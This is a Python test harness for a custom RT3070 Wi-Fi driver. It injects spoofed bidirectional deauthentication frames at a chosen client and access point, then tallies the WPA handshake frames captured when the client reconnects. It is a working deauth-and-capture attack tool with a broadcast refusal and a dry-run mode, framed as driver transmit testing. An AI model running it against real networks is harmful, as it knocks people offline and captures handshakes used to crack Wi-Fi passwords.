"""RT3070 (ALFA AWUS036NH) — live targeted-deauth injection harness (TX validation).

Drives the clean-room ``RT3070Driver`` DIRECTLY (like ``beacon_watch.py``), bypassing the
device manager. Brings the card up, tunes to the target AP's channel, and injects the
classic bidirectional deauth (spoof-AP -> client and spoof-client -> AP) via
``driver.inject_frame`` — the TX path (``tx.build_deauth`` -> ``tx.build_frame`` TXINFO/TXWI
-> bulk-OUT EP 0x01). This is the live gate for TX: does the card actually emit a deauth that
drops a client, and do we then capture the reconnect's 4-way handshake (EAPOL).

Everything up to *firing* TX is the agent's; pulling the trigger is yours [[passive_by_default]].

TARGETED ONLY — ``--client`` must be a specific unicast STA. Broadcast/multicast is refused
on purpose: a broadcast deauth knocks every station on the BSSID off, including this dev
machine if it shares the AP. Pick a client that is NOT this machine.

Usage (card plugged in + Zadig/WinUSB-bound to 148f:3070):
    # SAFE preview — brings up + tunes + builds frames, transmits NOTHING:
    uv run python scripts/rt3070/deauth_hw.py \\
        --bssid AA:BB:CC:DD:EE:FF --client 00:11:22:33:44:55 --channel 1 --dry-run
    # LIVE — actually injects (omit --dry-run); watch EAPOL increment after the client reconnects:
    uv run python scripts/rt3070/deauth_hw.py \\
        --bssid AA:BB:CC:DD:EE:FF --client 00:11:22:33:44:55 --channel 1 --listen 30

Target MACs stay on your terminal only; never commit them.
"""
from __future__ import annotations

import argparse
import asyncio
import logging
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

import libusb_package
import usb.core

from wifit3.chips.rt3070 import tx
from wifit3.chips.rt3070.driver import RT3070Driver
from wifit3.dot11.packet import Packet


def _str_to_mac(mac_str: str) -> bytes:
    parts = mac_str.split(":")
    if len(parts) != 6:
        raise ValueError(f"not a MAC address: {mac_str!r}")
    return bytes(int(x, 16) for x in parts)


class _HandshakeTally:
    """Driver rx callback: watch for the deauth's effect — target-AP beacons (proves we're
    on-channel + RX works), target-client frames, and EAPOL (the reconnect 4-way handshake =
    the deauth landed)."""

    def __init__(self, ap_bssid: str, client: str):
        self.ap = ap_bssid.lower()
        self.client = client.lower()
        self.frames = 0
        self.ap_beacons = 0
        self.client_frames = 0
        self.eapol = 0
        self.client_eapol = 0
        self.eapol_to_ap = 0      # client->AP (ToDS) = M2/M4
        self.eapol_from_ap = 0    # AP->client (FromDS) = M1/M3

    def __call__(self, parsed: Packet) -> None:
        self.frames += 1
        ftype = parsed.type
        bssid = (parsed.bssid or "").lower()
        src = (parsed.source or "").lower()
        dst = (parsed.dest or "").lower()
        to_ds = bool(parsed.to_ds)
        from_ds = bool(parsed.from_ds)
        involves_client = self.client in (src, dst)
        if ftype == "beacon" and bssid == self.ap:
            self.ap_beacons += 1
        if ftype == "eapol":
            self.eapol += 1
            if involves_client:
                self.client_eapol += 1
                if to_ds and not from_ds:
                    self.eapol_to_ap += 1
                elif from_ds and not to_ds:
                    self.eapol_from_ap += 1
        if involves_client:
            self.client_frames += 1


async def run(args) -> int:
    client = args.client.lower()
    first_octet = int(client.split(":")[0], 16)
    if client == "ff:ff:ff:ff:ff:ff" or (first_octet & 0x01):
        print(f"[REFUSED] --client {args.client} is broadcast/multicast. This harness is "
              f"targeted-only — pass a specific unicast STA (and not this machine).")
        return 2

    ap_mac = _str_to_mac(args.bssid)
    cl_mac = _str_to_mac(client)
    # Bidirectional targeted deauth (reason 7, class-3 frame from nonassociated STA).
    client_deauth = tx.build_deauth(cl_mac, ap_mac, src_mac=ap_mac)   # spoof AP -> client
    ap_deauth = tx.build_deauth(ap_mac, ap_mac, src_mac=cl_mac)       # spoof client -> AP

    print(f"[TARGET] deauth CLIENT {client} <-> AP {args.bssid.lower()} on ch "
          f"{args.channel}, {args.count}x burst")
    print(f"[SAFETY] confirm {client} is NOT this dev machine — targeted, never broadcast.")

    entry = RT3070Driver.SUPPORTED_IDS[0]
    backend = libusb_package.get_libusb1_backend()
    dev = usb.core.find(idVendor=entry.vid, idProduct=entry.pid, backend=backend)
    if dev is None:
        print(f"[FAIL] no {entry.vid:04x}:{entry.pid:04x} on the USB bus "
              "(plug in + Zadig/WinUSB-bind the card)")
        return 1
    try:
        dev.set_configuration()
    except usb.core.USBError as e:
        logging.debug("set_configuration: %s", e)

    driver = RT3070Driver.from_usb_device(dev, entry)
    tally = _HandshakeTally(args.bssid, client)
    driver.register_rx_callback(tally)

    def progress(pct, msg):
        print(f"  [{pct * 100:5.1f}%] {msg}")

    if not await driver.connect(progress):
        print("[FAIL] bring-up did not complete")
        return 1
    await driver.set_channel(args.channel)
    print(f"[*] tuned to channel {args.channel} (inject EP 0x{driver._bulk_out_ep:02x})")

    if args.dry_run:
        print("[DRY-RUN] not transmitting. Built frames:")
        print(f"    client-deauth ({len(client_deauth)} B): {client_deauth.hex()}")
        print(f"    ap-deauth     ({len(ap_deauth)} B): {ap_deauth.hex()}")
        await driver.close()
        return 0

    print(f"[*] deauth-and-listen for {args.listen:g}s ({args.count}x burst every "
          f"{args.interval:g}s), watching for the reconnect handshake. Ctrl-C to stop.")
    start = time.monotonic()
    sent = 0
    tx_error = None
    try:
        while time.monotonic() - start < args.listen:
            for _ in range(args.count):
                if await driver.inject_frame(client_deauth):
                    sent += 1
                if await driver.inject_frame(ap_deauth):
                    sent += 1
                await asyncio.sleep(0.005)
            await asyncio.sleep(args.interval)
            print(f"\r  {time.monotonic() - start:4.0f}s  sent={sent}  "
                  f"ap_beacons={tally.ap_beacons}  client_frames={tally.client_frames}  "
                  f"eapol={tally.client_eapol}/{tally.eapol}  "
                  f"M2M4={tally.eapol_to_ap} M1M3={tally.eapol_from_ap}", end="")
    except KeyboardInterrupt:
        pass
    except usb.core.USBError as e:
        tx_error = e
    finally:
        # Always stop the RX reader before the loop tears down, else its
        # call_soon_threadsafe hits a closed loop ("Event loop is closed").
        print()
        await driver.close()

    if tx_error is not None:
        print(f"[FAIL] bulk-OUT error after {sent} frames: {tx_error} "
              f"(if the pipe wedged, unplug/replug and rerun)")
        return 1

    print(f"[RESULT] injected {sent} deauth frames, no pipe fault. "
          f"Heard {tally.ap_beacons} target-AP beacons, {tally.frames} frames total, "
          f"{tally.client_frames} involving the client; EAPOL "
          f"{tally.client_eapol} from the client / {tally.eapol} total.")
    if tally.ap_beacons == 0:
        print("  [?] Did NOT hear the target AP on this channel — wrong channel / out of "
              "range / RX issue. The deauth test is inconclusive until we hear the AP.")
    elif tally.client_eapol > 0:
        print(f"  [PASS] Captured {tally.client_eapol} EAPOL handshake frame(s) FROM/TO the "
              "target client — it reconnected, so the deauth landed and TX is confirmed.")
    elif tally.eapol > 0:
        print(f"  [?] Saw {tally.eapol} EAPOL frame(s) but NONE involving the target client "
              "— another station's handshake, not proof our deauth worked.")
    elif tally.client_frames > 0:
        print("  [~] Heard the AP and the client, but no reconnect handshake — the client "
              "stayed associated, so the deauth likely isn't reaching it (TX suspect).")
    else:
        print("  [~] Heard the AP but no client traffic/handshake — client idle/absent, or "
              "the deauth isn't being transmitted. Inconclusive.")

    print(f"  [MONITOR] handshake msgs to/from client — M2/M4 (client->AP, ToDS)="
          f"{tally.eapol_to_ap}, M1/M3 (AP->client, FromDS)={tally.eapol_from_ap}.")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="RT3070 (AWUS036NH) targeted-deauth TX harness")
    ap.add_argument("--bssid", required=True, help="target AP BSSID (AA:BB:CC:DD:EE:FF)")
    ap.add_argument("--client", required=True,
                    help="target client STA (unicast only — broadcast is refused)")
    ap.add_argument("--channel", type=int, required=True, help="the AP's 2.4G channel")
    ap.add_argument("--count", type=int, default=10, help="frames per deauth burst (default 10)")
    ap.add_argument("--listen", type=float, default=30.0,
                    help="deauth-and-listen window in seconds (default 30)")
    ap.add_argument("--interval", type=float, default=2.0,
                    help="seconds between deauth bursts while listening (default 2)")
    ap.add_argument("--dry-run", action="store_true",
                    help="bring up + tune + build frames, but transmit NOTHING")
    ap.add_argument("--debug", action="store_true")
    args = ap.parse_args()
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format="%(asctime)s.%(msecs)03d [%(levelname)-5s] %(name)s: %(message)s",
        datefmt="%H:%M:%S",
    )
    return asyncio.run(run(args))


if __name__ == "__main__":
    sys.exit(main())
